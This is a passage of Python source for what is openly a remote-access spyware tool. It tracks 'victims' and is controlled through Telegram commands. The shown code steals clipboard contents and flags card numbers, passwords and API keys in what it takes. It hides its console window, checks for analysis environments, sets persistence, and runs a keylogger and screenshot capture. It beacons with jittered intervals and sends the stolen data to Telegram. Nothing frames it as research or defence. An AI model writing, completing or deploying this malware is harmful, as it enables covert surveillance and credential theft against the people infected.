        message += f"<b>Timestamp:</b> <code>{escape_html(datetime.datetime.now(datetime.timezone.utc).isoformat())}</code>\n\n"
        
        for proc in processes:
            message += f"• <code>{escape_html(proc['name'])}</code> (PID: <code>{escape_html(str(proc['pid']))}</code>) | User: <code>{escape_html(proc['username'])}</code> | CPU: <code>{escape_html(proc['cpu'])}</code> | Memory: <code>{escape_html(proc['memory'])}</code>\n"
        
        send_to_telegram('processes', message, victim_tracker=self.victim_tracker)
    
    def cmd_clipboard(self):
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            
            if data:
                sensitive = self.is_sensitive_data(data)
                
                message = "<b>📋 Requested Clipboard Content</b>\n\n"
                message += f"<b>Victim ID:</b> <code>{escape_html(self.victim_tracker.victim_id)}</code>\n"
                message += f"<b>Timestamp:</b> <code>{escape_html(datetime.datetime.now(datetime.timezone.utc).isoformat())}</code>\n"
                message += f"<b>Sensitive Data:</b> <code>{'Yes' if sensitive else 'No'}</code>\n\n"
                message += f"<pre>{escape_html(data)}</pre>"
                
                send_to_telegram('clipboard', message, victim_tracker=self.victim_tracker)
            else:
                send_to_telegram('info', "<b>ℹ️ Clipboard is empty</b>", victim_tracker=self.victim_tracker)
        except:
            send_to_telegram('error', "<b>❌ Failed to access clipboard</b>", victim_tracker=self.victim_tracker)
    
    def cmd_status(self):
        status_report = self.victim_tracker.get_status_report()
        
        message = "<b>📊 Victim Status Report</b>\n\n"
        message += f"<b>Victim ID:</b> <code>{escape_html(status_report['victim_id'])}</code>\n"
        message += f"<b>Status:</b> <code>{escape_html(status_report['status'])}</code>\n"
        message += f"<b>Uptime:</b> <code>{escape_html(status_report['uptime'])}</code>\n"
        message += f"<b>Last Activity:</b> <code>{escape_html(status_report['last_activity'])}</code>\n"
        message += f"<b>Memory Usage:</b> <code>{escape_html(status_report['memory_usage'])}</code>\n"
        message += f"<b>CPU Usage:</b> <code>{escape_html(status_report['cpu_usage'])}</code>\n\n"
        
        message += "<b>📈 Activity Count:</b>\n"
        message += f"• <b>Screenshots:</b> <code>{escape_html(str(status_report['activity_count']['screenshots']))}</code>\n"
        message += f"• <b>Keylogs:</b> <code>{escape_html(str(status_report['activity_count']['keylogs']))}</code>\n"
        message += f"• <b>System Reports:</b> <code>{escape_html(str(status_report['activity_count']['system_reports']))}</code>\n"
        message += f"• <b>Clipboard Logs:</b> <code>{escape_html(str(status_report['activity_count']['clipboard_logs']))}</code>\n"
        message += f"• <b>Commands Executed:</b> <code>{escape_html(str(status_report['activity_count']['commands_executed']))}</code>\n\n"
        
        message += "<b>🌍 Location:</b>\n"
        message += f"• <b>IP:</b> <code>{escape_html(status_report['geolocation']['ip'])}</code>\n"
        message += f"• <b>City:</b> <code>{escape_html(status_report['geolocation']['city'])}</code>\n"
        message += f"• <b>Region:</b> <code>{escape_html(status_report['geolocation']['region'])}</code>\n"
        message += f"• <b>Country:</b> <code>{escape_html(status_report['geolocation']['country'])}</code>\n"
        message += f"• <b>Organization:</b> <code>{escape_html(status_report['geolocation']['org'])}</code>\n"
        
        send_to_telegram('status', message, victim_tracker=self.victim_tracker)
    
    def cmd_victims(self):
        try:
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            
            cursor.execute("SELECT COUNT(*) FROM victims")
            total = cursor.fetchone()[0]
            
            fifteen_minutes_ago = (datetime.datetime.now() - datetime.timedelta(minutes=15)).isoformat()
            cursor.execute("SELECT COUNT(*) FROM victims WHERE last_seen > ?", (fifteen_minutes_ago,))
            online = cursor.fetchone()[0]
            
            offline = total - online
            
            message = "<b>🌐 Victims Status</b>\n\n"
            message += "<b>📊 Statistics:</b>\n"
            message += f"• <b>Total Victims:</b> <code>{total}</code>\n"
            message += f"• <b>Online Victims:</b> <code>{online}</code>\n"
            message += f"• <b>Offline Victims:</b> <code>{offline}</code>\n\n"
            
            online_percentage = (online / total * 100) if total > 0 else 0
            offline_percentage = 100 - online_percentage
            
            message += "<b>📈 Distribution:</b>\n"
            message += f"• <b>Online:</b> <code>{online_percentage:.1f}%</code>\n"
            message += f"• <b>Offline:</b> <code>{offline_percentage:.1f}%</code>\n\n"
            
            online_bars = int(online_percentage / 5)
            offline_bars = 20 - online_bars
            
            message += "<b>📊 Status Bar:</b>\n"
            message += f"<code>{'█' * online_bars}{'░' * offline_bars}</code>\n"
            message += f"<code>{online_percentage:.1f}% Online</code>\n\n"
            
            message += f"<b>⏰ Last Updated:</b> <code>{escape_html(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))}</code>"
            
            send_to_telegram('victims_status', message, victim_tracker=self.victim_tracker)
            conn.close()
        except Exception as e:
            send_to_telegram('error', "<b>❌ Failed to get victims status</b>", victim_tracker=self.victim_tracker)
    
    def cmd_help(self):
        message = "<b>🤖 Available Commands</b>\n\n"
        message += "<b>📸 /screenshot</b> - Take a screenshot\n"
        message += "<b>🔑 /keystrokes</b> - Get recorded keystrokes\n"
        message += "<b>🖥️ /system</b> - Get system information\n"
        message += "<b>⚙️ /processes</b> - List running processes\n"
        message += "<b>📋 /clipboard</b> - Get clipboard content\n"
        message += "<b>📊 /status</b> - Get victim status\n"
        message += "<b>🌐 /victims</b> - Show victim statistics\n"
        message += "<b>❓ /help</b> - Show this help message\n"
        message += "<b>🚪 /exit</b> - Terminate the session\n\n"
        message += "<i>Tip: All data is automatically encrypted and compressed</i>"
        
        send_to_telegram('help', message, victim_tracker=self.victim_tracker)
    
    def cmd_exit(self):
        message = "<b>🛑 Terminating Session</b>\n\n"
        message += f"<b>Victim ID:</b> <code>{escape_html(self.victim_tracker.victim_id)}</code>\n"
        message += f"<b>Timestamp:</b> <code>{escape_html(datetime.datetime.now(datetime.timezone.utc).isoformat())}</code>\n\n"
        message += "<i>Session terminated by operator.</i>"
        
        send_to_telegram('exit', message, victim_tracker=self.victim_tracker)
        
        self.victim_tracker.status = "terminated"
        self.victim_tracker.update_victim_status("terminated")
        status_report = self.victim_tracker.get_status_report()
        send_to_telegram('victim_offline', json.dumps(status_report), victim_tracker=self.victim_tracker)
        
        try:
            self.keylogger.listener.stop()
        except:
            pass
        
        sys.exit(0)
    
    def is_sensitive_data(self, text):
        credit_card_pattern = r'\b(?:\d[ -]*?){13,16}\b'
        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
        password_patterns = [
            r'\bpassword\s*[:=]\s*\S+',
            r'\bpwd\s*[:=]\s*\S+',
            r'\bpass\s*[:=]\s*\S+',
            r'\blogin\s*[:=]\s*\S+',
            r'\bsignin\s*[:=]\s*\S+',
            r'\bcredential\s*[:=]\s*\S+'
        ]
        
        if re.search(credit_card_pattern, text):
            return True
        
        if re.search(email_pattern, text):
            return True
        
        for pattern in password_patterns:
            if re.search(pattern, text, re.IGNORECASE):
                return True
        
        sensitive_keywords = [
            'credit card', 'cvv', 'expiration', 'security code',
            'ssn', 'social security', 'bank account', 'routing number',
            'api key', 'secret key', 'access token', 'private key'
        ]
        
        for keyword in sensitive_keywords:
            if keyword.lower() in text.lower():
                return True
        
        return False

def hide_console():
    if platform.system() == 'Windows':
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

def heartbeat_loop(victim_tracker):
    while True:
        dynamic_interval = get_dynamic_interval(HEARTBEAT_INTERVAL)
        time.sleep(apply_jitter(dynamic_interval))
        status_report = victim_tracker.get_status_report()
        
        message = "<b>💓 Heartbeat</b>\n\n"
        message += f"<b>Victim ID:</b> <code>{escape_html(status_report['victim_id'])}</code>\n"
        message += f"<b>Status:</b> <code>{escape_html(status_report['status'])}</code>\n"
        message += f"<b>Uptime:</b> <code>{escape_html(status_report['uptime'])}</code>\n"
        message += f"<b>Memory:</b> <code>{escape_html(status_report['memory_usage'])}</code>\n"
        message += f"<b>CPU:</b> <code>{escape_html(status_report['cpu_usage'])}</code>\n"
        
        send_to_telegram('heartbeat', message, victim_tracker=victim_tracker)
        victim_tracker.update_victim_status("active")

def memory_monitor_loop(victim_tracker):
    while True:
        time.sleep(MEMORY_CHECK_INTERVAL)
        if check_memory_usage():
            alert_message = "<b>⚠️ Memory Alert</b>\n\n"
            alert_message += f"<b>Victim ID:</b> <code>{escape_html(victim_tracker.victim_id)}</code>\n"
            alert_message += f"<b>Timestamp:</b> <code>{escape_html(datetime.datetime.now(datetime.timezone.utc).isoformat())}</code>\n"
            alert_message += f"<b>Memory Usage:</b> <code>{escape_html(str(psutil.virtual_memory().percent))}%</code>\n\n"
            alert_message += "<i>Activity reduced to conserve resources.</i>"
            
            send_to_telegram('memory_alert', alert_message, victim_tracker=victim_tracker)

def activity_monitor_loop():
    while True:
        time.sleep(60)
        adjust_intervals_based_on_activity()

def main():
    if anti_analysis_checks():
        sys.exit(0)
    
    victim_tracker = VictimTracker()
    hide_console()
    set_persistence()
    
    keylogger = AdvancedKeylogger(victim_tracker)
    clipboard_monitor = ClipboardMonitor(victim_tracker)
    screenshot_capture = StealthScreenshotCapture(victim_tracker)
    system_monitor = SystemMonitor(victim_tracker)
    command_handler = CommandHandler(victim_tracker, keylogger, screenshot_capture, system_monitor)
    
    initial_message = "<b>🆕 New Victim Connected</b>\n\n"
    initial_message += f"<b>Victim ID:</b> <code>{escape_html(victim_tracker.victim_id)}</code>\n"
    initial_message += f"<b>Timestamp:</b> <code>{escape_html(datetime.datetime.now(datetime.timezone.utc).isoformat())}</code>\n"
    initial_message += f"<b>Location:</b> <code>{escape_html(victim_tracker.geolocation['city'] + ', ' + victim_tracker.geolocation['country'])}</code>\n"
    initial_message += f"<b>System:</b> <code>{escape_html(platform.system() + ' ' + platform.release())}</code>\n\n"
    initial_message += "<i>Type /help for available commands.</i>"
    
    send_to_telegram('victim_online', initial_message, victim_tracker=victim_tracker)
    
    keylogger.start()
    clipboard_monitor.start()
    screenshot_capture.start()
    system_monitor.start()
    command_handler.start()
    
    threading.Thread(target=heartbeat_loop, args=(victim_tracker,), daemon=True).start()
    threading.Thread(target=memory_monitor_loop, args=(victim_tracker,), daemon=True).start()
    threading.Thread(target=activity_monitor_loop, daemon=True).start()
    
    try:
        while True:
            time.sleep(3600)
    except KeyboardInterrupt:
        victim_tracker.status = "offline"
        victim_tracker.update_victim_status("offline")
        status_report = victim_tracker.get_status_report()
        send_to_telegram('victim_offline', json.dumps(status_report), victim_tracker=victim_tracker)
        sys.exit(0)

if __name__ == "__main__":
    main()